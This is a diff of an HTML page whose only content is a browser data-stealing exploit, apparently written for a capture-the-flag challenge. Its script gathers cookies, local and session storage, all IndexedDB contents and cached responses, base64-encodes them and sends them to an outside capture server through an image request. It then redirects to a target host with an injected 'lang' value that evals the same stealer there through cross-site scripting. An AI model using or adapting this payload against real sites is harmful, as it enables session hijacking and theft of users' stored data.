@@ -1,18 +1,27 @@
 <!DOCTYPE html>
 <html><body><script>
 async function g(){
-  let c=document.cookie||'';
-  let l,s,i,x='';try{l=JSON.stringify(localStorage)}catch{}try{s=JSON.stringify(sessionStorage)}catch{}
-  try{if(window.indexedDB){i={};let d=window.indexedDB.databases?await window.indexedDB.databases():[{name:'db'}];
-  for(let dbn of d.map(db=>db.name).filter(Boolean)){try{let req=indexedDB.open(dbn),db=await new Promise(r=>{req.onsuccess=()=>r(req.result);req.onerror=()=>r()} );
-  if(db){i[dbn]={};for(let sn of Array.from(db.objectStoreNames)){try{let tx=db.transaction(sn).objectStore(sn).getAll(),st=await new Promise(r=>{tx.onsuccess=()=>r(tx.result);tx.onerror=()=>r('')});
-  i[dbn][sn]=st}catch{}}db.close();}}catch{}}i=JSON.stringify(i)}}catch{}try{if(window.caches){let ks=await caches.keys(),o={};
-  for(let k of ks){let cache=await caches.open(k),rq=await cache.keys();o[k]=[];for(let r of rq){try{let rs=await cache.match(r),t=rs?await rs.text():'';
-  o[k].push({u:r.url,r:t})}catch{}}}x=JSON.stringify(o)}}catch{}return{cookie:c,local:l||'',session:s||'',idb:i||'',caches:x||''}}
+  let c=document.cookie||'',l,s,i,x='';
+  try{l=JSON.stringify(localStorage)}catch{}
+  try{s=JSON.stringify(sessionStorage)}catch{}
+  try{if(window.indexedDB){i={};
+    let d=window.indexedDB.databases?await window.indexedDB.databases():[{name:'db'}];
+    for(let dbn of d.map(db=>db.name).filter(Boolean)){try{
+      let req=indexedDB.open(dbn),db=await new Promise(r=>{req.onsuccess=()=>r(req.result);req.onerror=()=>r()});
+      if(db){i[dbn]={};for(let sn of Array.from(db.objectStoreNames)){try{
+        let tx=db.transaction(sn).objectStore(sn).getAll(),st=await new Promise(r=>{tx.onsuccess=()=>r(tx.result);tx.onerror=()=>r('')});
+        i[dbn][sn]=st}catch{}}db.close();}}catch{}}i=JSON.stringify(i)}}catch{}
+  try{if(window.caches){let ks=await caches.keys(),o={};
+    for(let k of ks){let cache=await caches.open(k),rq=await cache.keys();o[k]=[];
+      for(let r of rq){try{let rs=await cache.match(r),t=rs?await rs.text():'';
+        o[k].push({u:r.url,r:t})}catch{}}}x=JSON.stringify(o)}}catch{}
+  return{cookie:c,local:l||'',session:s||'',idb:i||'',caches:x||''}
+}
 function e(d,f){let p=btoa(unescape(encodeURIComponent(JSON.stringify(d))));(new Image).src=`https://ssrf-eta.vercel.app/api/capture?from=${f}&c=${p}`}
-(async()=>{e(await g(),'static');
-setTimeout(()=>{let p=`(async()=>{let g=${g.toString()},e=${e.toString()};e(await g(),'chal2')})();`;
-let xss=`";eval(decodeURIComponent("${encodeURIComponent(p)}"));//`;
-location.replace('http://chal2.lagncra.sh:8426/?lang='+encodeURIComponent(xss));},500);
+(async()=>{
+  e(await g(),'static');
+  let p=`(async()=>{let g=${g.toString()},e=${e.toString()};e(await g(),'chal2')})();`,
+      xss=`";eval(decodeURIComponent("${encodeURIComponent(p)}"));//`;
+  location.href='http://chal2.lagncra.sh:8426/?lang='+encodeURIComponent(xss);
 })();
 </script></body></html>
